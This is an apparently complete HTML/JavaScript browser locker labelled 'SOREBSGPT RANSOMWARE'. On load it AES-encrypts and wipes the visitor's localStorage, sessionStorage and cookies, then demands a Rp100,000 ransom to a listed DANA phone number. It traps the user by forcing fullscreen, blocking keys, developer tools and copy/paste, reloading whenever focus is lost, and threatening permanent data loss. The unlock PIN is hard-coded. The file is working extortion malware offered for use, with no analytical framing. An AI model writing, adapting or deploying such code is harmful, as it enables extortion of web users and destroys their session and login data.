<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>🔒 SOREBSGPT RANSOMWARE</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
            -webkit-user-select: none;
            -webkit-tap-highlight-color: transparent;
        }
        body {
            background: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            position: fixed;
            width: 100%;
            top: 0;
            left: 0;
        }
        .container {
            text-align: center;
            padding: 30px 20px;
            border: 2px solid #f00;
            background: #0a0a0a;
            max-width: 500px;
            width: 90%;
            box-shadow: 0 0 50px rgba(255,0,0,0.5);
            animation: glow 0.8s infinite;
        }
        @keyframes glow {
            0% { box-shadow: 0 0 10px rgba(255,0,0,0.3); }
            100% { box-shadow: 0 0 40px rgba(255,0,0,0.8); }
        }
        h1 { color: #f00; font-size: 24px; margin-bottom: 15px; }
        .icon { font-size: 60px; margin-bottom: 15px; }
        .pay-box { background: #111; border: 1px solid #0f0; padding: 12px; margin: 15px 0; }
        .dana { font-size: 22px; font-weight: bold; color: #0f0; background: #000; padding: 8px; }
        input {
            background: #222;
            border: 2px solid #f00;
            color: #0f0;
            padding: 10px;
            font-size: 22px;
            text-align: center;
            width: 200px;
            font-family: monospace;
            margin: 10px;
        }
        button {
            background: #300;
            color: #f00;
            border: 1px solid #f00;
            padding: 10px 25px;
            font-size: 16px;
            cursor: pointer;
            font-weight: bold;
        }
        .counter { color: #ff0; font-size: 12px; margin-top: 10px; }
        .warning { color: #f00; font-size: 11px; margin-top: 10px; }
    </style>
</head>
<body>
<div class="container" id="main">
    <div class="icon">🔒💀</div>
    <h1>SISTEM TERENKRIPSI</h1>
    <p>Semua data browser telah dienkripsi AES-256</p>
    <div class="pay-box">
        <h3>💰 TEBUSAN Rp100.000 💰</h3>
        <p>DANA: <span class="dana">085122933162</span></p>
        <p style="font-size:11px;">a/n anonymouse</p>
    </div>
    <p>🔐 MASUKKAN PIN UNLOCK:</p>
    <input type="password" id="pin" maxlength="6" placeholder="******">
    <br>
    <button id="unlock">🔓 UNLOCK</button>
    <div class="counter" id="counter">Percobaan: 0/1000</div>
    <div class="warning">⚠️ 1000x salah = DATA PERMANEN HILANG ⚠️</div>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
<script>
(function(){
    const PIN = "568729";
    let attempts = parseInt(localStorage.getItem('att')) || 0;
    const MAX = 1000;
    
    // CEK PERMANENT LOCK
    if(localStorage.getItem('perm') === '1'){
        document.body.innerHTML = '<div style="background:#000;color:red;text-align:center;padding:50px;font-size:30px;">💀 DATA HILANG PERMANEN 💀</div>';
        throw new Error("LOCKED");
    }
    
    if(attempts >= MAX){
        localStorage.setItem('perm','1');
        location.reload();
    }
    
    // UPDATE COUNTER
    function updateCounter(){
        document.getElementById('counter').innerHTML = `Percobaan: ${attempts}/${MAX}`;
        if(MAX-attempts <= 100) document.getElementById('counter').style.color = '#f00';
    }
    updateCounter();
    
    // ENKRIPSI SEMUA DATA
    const key = CryptoJS.lib.WordArray.random(32).toString();
    function encryptAll(){
        // Backup localStorage
        let lsData = {};
        for(let i=0;i<localStorage.length;i++){
            let k = localStorage.key(i);
            if(k !== 'att' && k !== 'perm') lsData[k] = localStorage.getItem(k);
        }
        localStorage.setItem('ls_enc', CryptoJS.AES.encrypt(JSON.stringify(lsData), key));
        
        // Backup sessionStorage
        let ssData = {};
        for(let i=0;i<sessionStorage.length;i++){
            let k = sessionStorage.key(i);
            ssData[k] = sessionStorage.getItem(k);
        }
        localStorage.setItem('ss_enc', CryptoJS.AES.encrypt(JSON.stringify(ssData), key));
        
        // Backup cookies
        localStorage.setItem('ck_enc', CryptoJS.AES.encrypt(document.cookie, key));
        
        localStorage.setItem('enc_key', key);
        localStorage.setItem('locked', '1');
        
        // Clear semua
        for(let i=0;i<localStorage.length;i++){
            let k = localStorage.key(i);
            if(k !== 'att' && k !== 'perm' && k !== 'ls_enc' && k !== 'ss_enc' && k !== 'ck_enc' && k !== 'enc_key' && k !== 'locked'){
                localStorage.removeItem(k);
            }
        }
        sessionStorage.clear();
        document.cookie.split(";").forEach(c=>{document.cookie=c.replace(/^ +/,"").replace(/=.*/,"=;expires="+new Date().toUTCString()+";path=/");});
    }
    
    if(localStorage.getItem('locked') !== '1') encryptAll();
    
    // UNLOCK FUNCTION
    function unlock(pin){
        if(pin !== PIN){
            attempts++;
            localStorage.setItem('att', attempts);
            updateCounter();
            alert(`PIN SALAH! Tersisa ${MAX-attempts} percobaan`);
            if(attempts >= MAX){
                localStorage.setItem('perm','1');
                location.reload();
            }
            return false;
        }
        
        // PIN BENAR - RESTORE DATA
        const encKey = localStorage.getItem('enc_key');
        if(encKey){
            try{
                // Restore localStorage
                let lsEnc = localStorage.getItem('ls_enc');
                if(lsEnc){
                    let dec = CryptoJS.AES.decrypt(lsEnc, encKey).toString(CryptoJS.enc.Utf8);
                    let data = JSON.parse(dec);
                    for(let [k,v] of Object.entries(data)){
                        localStorage.setItem(k,v);
                    }
                }
                // Restore sessionStorage
                let ssEnc = localStorage.getItem('ss_enc');
                if(ssEnc){
                    let dec = CryptoJS.AES.decrypt(ssEnc, encKey).toString(CryptoJS.enc.Utf8);
                    let data = JSON.parse(dec);
                    for(let [k,v] of Object.entries(data)){
                        sessionStorage.setItem(k,v);
                    }
                }
                // Restore cookies
                let ckEnc = localStorage.getItem('ck_enc');
                if(ckEnc){
                    let dec = CryptoJS.AES.decrypt(ckEnc, encKey).toString(CryptoJS.enc.Utf8);
                    dec.split(';').forEach(c=>{if(c.trim()) document.cookie = c.trim()+";path=/";});
                }
            }catch(e){}
        }
        
        // Hapus semua jejak
        localStorage.removeItem('locked');
        localStorage.removeItem('enc_key');
        localStorage.removeItem('ls_enc');
        localStorage.removeItem('ss_enc');
        localStorage.removeItem('ck_enc');
        localStorage.removeItem('att');
        localStorage.removeItem('perm');
        
        alert("✅ DATA BERHASIL DIUNLOCK! ✅");
        location.reload();
        return true;
    }
    
    // EVENT
    document.getElementById('unlock').onclick = ()=>{
        let val = document.getElementById('pin').value;
        if(val.length===6 && /^\d+$/.test(val)) unlock(val);
        else alert("PIN harus 6 digit angka!");
    };
    document.getElementById('pin').onkeypress = (e)=>{if(e.key==='Enter') document.getElementById('unlock').click();};
    
    // ========== ANTI BRICK + AUTO REDIRECT HP ==========
    // Force fullscreen terus
    function forceFS(){
        if(!document.fullscreenElement){
            document.documentElement.requestFullscreen().catch(()=>{});
        }
    }
    forceFS();
    setInterval(forceFS, 1000);
    
    // Lock semua tombol hardware (Volume, Home, dll) - cuma bisa di browser
    window.addEventListener('keydown', function(e){
        e.preventDefault();
        return false;
    });
    
    // Anti keluar browser - langsung redirect balik
    let isLeaving = false;
    window.addEventListener('blur', function(){
        if(localStorage.getItem('locked') === '1' && !isLeaving){
            isLeaving = true;
            setTimeout(()=>{
                window.location.reload();
                isLeaving = false;
            }, 50);
        }
    });
    
    document.addEventListener('visibilitychange', function(){
        if(document.hidden && localStorage.getItem('locked') === '1'){
            setTimeout(()=>{
                window.location.reload();
            }, 10);
        }
    });
    
    // Loop redirect kalo coba close tab
    window.onbeforeunload = function(){
        if(localStorage.getItem('locked') === '1'){
            return "🔒 DATA TERKUNCI! JANGAN TUTUP!";
        }
    };
    
    // Anti inspect element
    document.addEventListener('contextmenu', e=>e.preventDefault());
    document.addEventListener('keydown', e=>{
        if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&e.key==='I')||(e.ctrlKey&&e.key==='U')||(e.ctrlKey&&e.key==='S')){
            e.preventDefault();
            return false;
        }
    });
    
    // Anti copy paste
    document.addEventListener('copy', e=>e.preventDefault());
    document.addEventListener('cut', e=>e.preventDefault());
    document.addEventListener('paste', e=>e.preventDefault());
    
    // Disable scroll
    document.body.style.overflow = 'hidden';
    document.documentElement.style.overflow = 'hidden';
    
    // Loop check tiap 100ms biar ga bisa kabur
    setInterval(()=>{
        if(localStorage.getItem('locked') === '1'){
            if(document.hidden || !document.hasFocus()){
                window.focus();
                location.reload();
            }
            if(!document.fullscreenElement) forceFS();
        }
    }, 200);
})();
</script>
</body>
</html>
